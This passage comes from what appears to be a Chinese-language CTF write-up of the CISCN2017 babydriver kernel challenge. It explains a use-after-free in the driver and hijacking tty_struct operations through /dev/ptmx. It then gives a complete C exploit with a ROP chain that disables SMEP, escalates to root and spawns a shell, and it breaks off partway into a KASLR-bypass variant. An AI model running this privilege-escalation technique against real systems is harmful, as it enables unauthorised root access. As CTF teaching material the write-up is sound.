class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到漏洞十分的明显，那就是<code>release</code>函数对堆块进行<code>free</code>操作后没有对指针进行判空，造成了<code>UAF</code>漏洞，我们可以同时打开<code>2</code>次<code>babydev</code>，再<code>release</code>第一个，即可以对第二个进行对<code>UAF</code>漏洞的利用<br>可是我们要怎么控制程序流呢？这时候我们就要关注<code>tty_struct</code>这一个结构体</p><h4 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty_struct"></a>tty_struct</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="type">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>可以看到该结构体存在一个<code>tty_operations</code>指针</p><h4 id="tty-operations"><a href="#tty-operations" class="headerlink" title="tty_operations"></a>tty_operations</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>可以看到该结构体就像是我们<code>glibc</code>中<code>IO_file</code>的虚表一样，我们可以通过修改里面的函数指针来劫持程序流<br>该结构体会在<code>open /dev/ptmx</code>时被创建<br>这里采用的是<code>ret2usr</code>，我们可以先利用<code>UAF</code>将<code>tty_struct</code>给读取出来，然后在其<code>ops</code>的地方写入我们伪造的<code>tty_operations</code>的地址，在伪造的<code>tty_operations</code>偏移为1的位置写入我们<code>rop</code>链的地址。当我们对<code>/dev/ptmx</code>进行<code>write</code>操作时，程序会调用<code>tty_operations</code>偏移为<code>7</code>的地方的函数指针，通过调试我们可以看到此时的<code>rax</code>的值刚好为我们伪造的<code>tty_operations</code>结构体的地址，此时我们可以利用下面这条<code>gadget</code>：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff8181bfc5: mov rsp, rax; dec ebx; jmp 0xffffffff8181bf7e;</span><br><span class="line">0xffffffff8181bf7e: ret;</span><br></pre></td></tr></table></figure><p>来实现栈迁移，其效果很明显，即<code>rsp</code>来到了<code>tty_operations</code>上，此时再次利用下面两条<code>gadget</code>：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff8100ce6e: pop rax, ret</span><br><span class="line"></span><br><span class="line">0xffffffff8181bfc5: mov rsp, rax; dec ebx; jmp 0xffffffff8181bf7e;</span><br><span class="line">0xffffffff8181bf7e: ret;</span><br></pre></td></tr></table></figure><p>即可令<code>rsp</code>来到我们的<code>rop</code>链上，此时即可执行我们的<code>rop</code>链来实现提权</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>      </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff810d238d</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rax_ret = <span class="number">0xffffffff8100ce6e</span>;</span><br><span class="line"><span class="type">size_t</span> mov_cr4_rdi_pop_rbp_ret = <span class="number">0xffffffff81004d80</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rsp_rax_dec_ebx_ret = <span class="number">0xffffffff8181bfc5</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_pop_rbp_ret = <span class="number">0xffffffff81063694</span>;</span><br><span class="line"><span class="type">size_t</span> iretq_ret = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="type">size_t</span> ret = <span class="number">0xffffffff813659b6</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_sp),<span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)( (*pkc)(<span class="number">0</span>) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_stats();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取函数的地址</span></span><br><span class="line">    FILE* sym_table_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x20</span>], i = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = pop_rdi_ret;</span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = mov_cr4_rdi_pop_rbp_ret;  <span class="comment">// bypass smep</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = getRoot;</span><br><span class="line">    rop[i++] = swapgs_pop_rbp_ret;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = iretq_ret;</span><br><span class="line">    rop[i++] = getShell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_op[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x10</span>; j++)</span><br><span class="line">        fake_op[j] = mov_rsp_rax_dec_ebx_ret;</span><br><span class="line"></span><br><span class="line">    fake_op[<span class="number">0</span>] = pop_rax_ret;  <span class="comment">//令rax指向我们的rop</span></span><br><span class="line">    fake_op[<span class="number">1</span>] = rop;</span><br><span class="line">    fake_op[<span class="number">7</span>] = mov_rsp_rax_dec_ebx_ret;  <span class="comment">// 原为write函数指针</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    read(fd2, fake_tty, <span class="number">0x40</span>);  <span class="comment">// 读取tty_struct的数据</span></span><br><span class="line">    fake_tty[<span class="number">3</span>] = fake_op;  <span class="comment">// hijack *ops</span></span><br><span class="line">    write(fd2, fake_tty, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    write(fd3, buf, <span class="number">0x8</span>);  <span class="comment">// tty_operation -&gt; write</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CISCN2017-babydriver-KASLR-kptr-restrict"><a href="#CISCN2017-babydriver-KASLR-kptr-restrict" class="headerlink" title="CISCN2017 babydriver+KASLR+kptr_restrict"></a>CISCN2017 babydriver+KASLR+kptr_restrict</h2><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>开启了<code>KASLR</code>后地址随机化其由于开启了<code>kptr_restrict</code>，我们无法直接从<code>kallsyms</code>中直接读取出函数的地址，这时候我们就需要泄露出地址来计算偏移。在之前我能够将<code>tty_struct</code>给泄露出来，而在这一个结构体中，<code>const struct tty_operations *ops;</code> 默认指向<code>ptm_unix98_ops</code> 或 <code>pty_unix98_ops</code>。因此，我们能够利用这个来泄露出内核的基址，然后计算出函数和<code>gadget</code>的准确位置，其他操作和之前一样</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>      </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 